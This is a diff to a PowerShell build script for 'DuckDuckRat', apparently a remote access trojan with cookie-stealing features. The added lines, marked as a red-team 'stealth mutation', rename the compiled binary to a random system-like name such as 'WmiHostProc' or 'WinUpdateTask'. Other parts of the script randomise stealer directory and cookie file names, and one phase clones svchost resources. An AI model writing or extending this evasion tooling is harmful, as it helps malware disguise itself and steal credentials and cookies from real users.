@@ -49,6 +49,11 @@ $content = $content -replace 'APP_DATA_SUBDIR = ".*?"', "APP_DATA_SUBDIR = `"$Ra
 $RandStealerDir = "$((Get-Random -Minimum 1000 -Maximum 9999))Svc"
 $content = $content -replace 'STEALER_DIR_NAME = ".*?"', "STEALER_DIR_NAME = `"$RandStealerDir`""
 
+# 5. [RED TEAM] Randomize Binary Name (Stealth Mutation)
+$BinaryNames = @("WinSvcNet", "NetSvcUpdate", "WmiHostProc", "SysHostDiag", "WinUpdateTask", "SvcCacheLib")
+$RandName = $BinaryNames[(Get-Random -Maximum $BinaryNames.Count)] + "_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".exe"
+Write-Host "[*] Random Binary Name Assigned: $RandName" -ForegroundColor Cyan
+
 $RandCookie = "cache_$((Get-Random -Minimum 1000 -Maximum 9999)).db"
 $content = $content -replace 'COOKIE_FILE_NAME = ".*?"', "COOKIE_FILE_NAME = `"$RandCookie`""
 
@@ -220,7 +225,12 @@ Write-Host "[*] Phase 5: Final Monolithic AOT Build (DuckDuckRat)..." -Foregroun
 dotnet publish DuckDuckRat.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
 if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }
 
-$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\DuckDuckRat.exe"
+$BuildExe = "bin\Release\net8.0-windows\win-x64\publish\DuckDuckRat.exe"
+$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\$RandName"
+
+if (Test-Path $BuildExe) {
+    Move-Item -Path $BuildExe -Destination $FinalExe -Force
+}
 
 Write-Host "[*] Phase 6: Resource Mimicry (svchost cloning)..." -ForegroundColor Cyan
 dotnet publish tools\ResourceCloner.csproj -c Release -r win-x64 --self-contained true -o tools\publish --nologo
